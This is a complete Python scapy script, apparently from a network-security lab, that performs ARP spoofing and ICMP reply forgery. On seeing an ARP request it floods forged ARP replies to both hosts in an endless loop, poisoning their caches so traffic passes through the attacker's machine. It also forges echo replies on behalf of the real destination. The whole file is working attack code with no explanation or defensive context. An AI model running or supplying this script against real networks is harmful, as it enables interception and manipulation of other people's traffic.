#!/usr/bin/python3

from scapy.all import *
import threading

INTERFACE = "br-b6d58918591d"
MY_MAC_ADDRESS = get_if_hwaddr (INTERFACE)

th= 0

def spoofingARP (request):
    response = ARP()
    response["ARP"].op = 2
    response["ARP"].hwsrc = MY_MAC_ADDRESS
    response["ARP"].hwdst = request["ARP"].hwsrc
    response["ARP"].psrc = request["ARP"].pdst
    response["ARP"].pdst = request["ARP"].psrc
    
    response2 = ARP ()
    response2["ARP"].op = 2
    response2["ARP"].hwsrc= request["ARP"].hwsrc 
    response2["ARP"].hwdst = MY_MAC_ADDRESS
    response2["ARP"].psrc = request["ARP"].psrc 
    response2["ARP"].pdst = request["ARP"].pdst
    
    while True:
        send(response, verbose = 0) 
        send(response2, verbose = 0)

def spoofer(request):
    if request.haslayer("ARP") and request[ARP].op == 1:
        global th
        if not th:
            t1 = threading.Thread (target = spoofingARP, args = (request, ))
            th = 1
            t1.start()
    if request.haslayer ("ICMP") and request["ICMP"].type == 8: 
        print(f"ICMP request from {request[IP].src} to {request[IP].dst}") 
        response = IP()/ICMP()/Raw()
        response["IP"].src = request["IP"].dst 
        response["IP"].dst = request["IP"].src 
        response["IP"].ihl = request["IP"].ihl
        response["ICMP"].type = 0
        response["ICMP"].id = request["ICMP"].id 
        response["ICMP"].seq = request["ICMP"].seq
        response["Raw"].load = request["Raw"].load
        print (f"ICMP response to {response[IP].dst} as {response[IP].src}") 
        sent = send (response, verbose = 0) 
        print("Sent spoofed echo-reply")

sniff (prn=spoofer, iface=INTERFACE)